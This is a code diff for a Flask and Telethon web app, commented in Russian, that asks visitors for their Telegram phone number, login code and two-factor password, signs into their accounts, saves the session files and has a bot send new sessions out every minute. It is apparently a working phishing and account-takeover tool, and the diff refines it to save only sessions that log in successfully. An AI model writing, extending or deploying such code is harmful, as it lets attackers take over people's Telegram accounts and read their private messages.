@@ -19,7 +19,8 @@ loop = asyncio.new_event_loop()
 bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
 
 sent_files = set()
-clients = {}
+clients = {}  # временные клиенты в памяти
+
 
 async def send_new_sessions():
     while True:
@@ -34,35 +35,50 @@ async def send_new_sessions():
                 print(f"Ошибка при отправке файла {file_name}: {e}")
         await asyncio.sleep(60)
 
+
 def start_loop():
     asyncio.set_event_loop(loop)
     bot.start(bot_token=BOT_TOKEN)
     loop.create_task(send_new_sessions())
     loop.run_forever()
 
+
 threading.Thread(target=start_loop, daemon=True).start()
+
 
 def run_async(coro):
     return asyncio.run_coroutine_threadsafe(coro, loop).result()
 
-async def create_and_connect_client(session_name, phone):
-    client = TelegramClient(session_name, API_ID, API_HASH, loop=loop)
+
+async def create_and_connect_client(phone):
+    # создаем временный клиент (сессия в памяти)
+    client = TelegramClient(None, API_ID, API_HASH, loop=loop)
     await client.connect()
     await client.send_code_request(phone)
     clients[phone] = client
     return client
 
+
+def save_client_to_file(phone, client):
+    """После успешного логина переносим временную сессию в файл"""
+    safe_phone = phone.replace('+', '').replace(' ', '').replace('(', '').replace(')', '')
+    session_name = f"sessions/{safe_phone}"
+    new_client = TelegramClient(session_name, API_ID, API_HASH, loop=loop)
+    new_client.session = client.session
+    new_client.session.save()
+
+
 @app.route("/", methods=["GET", "POST"])
 def index():
     if request.method == "POST":
         phone = request.form["phone"].strip()
-        session_name = f"sessions/{phone.replace('+', '').replace(' ', '').replace('(', '').replace(')', '')}"
         try:
-            run_async(create_and_connect_client(session_name, phone))
+            run_async(create_and_connect_client(phone))
             return render_template("index.html", stage="code", phone=phone)
         except Exception as e:
             return render_template("index.html", stage="phone", error=str(e))
     return render_template("index.html", stage="phone")
+
 
 @app.route("/code", methods=["POST"])
 def code():
@@ -75,6 +91,10 @@ def code():
             return "Сессия не найдена.", None
         try:
             await client.sign_in(phone=phone, code=code)
+
+            # Сохраняем сессию только после успешного входа
+            save_client_to_file(phone, client)
+
             return "Авторизация успешна! ✅", None
         except SessionPasswordNeededError:
             return None, "2FA"
@@ -89,6 +109,7 @@ def code():
     else:
         return redirect(url_for('success'))
 
+
 @app.route("/password", methods=["POST"])
 def password():
     phone = request.form["phone"].strip()
@@ -100,6 +121,10 @@ def password():
             return "Сессия не найдена."
         try:
             await client.sign_in(password=password)
+
+            # Сохраняем сессию после 2FA
+            save_client_to_file(phone, client)
+
             return "Авторизация через 2FA успешна! ✅"
         except Exception as e:
             return f"Ошибка авторизации: {e}"
@@ -110,9 +135,11 @@ def password():
     else:
         return render_template("index.html", stage="phone", error=message)
 
+
 @app.route("/success")
 def success():
     return render_template("success.html")
+
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
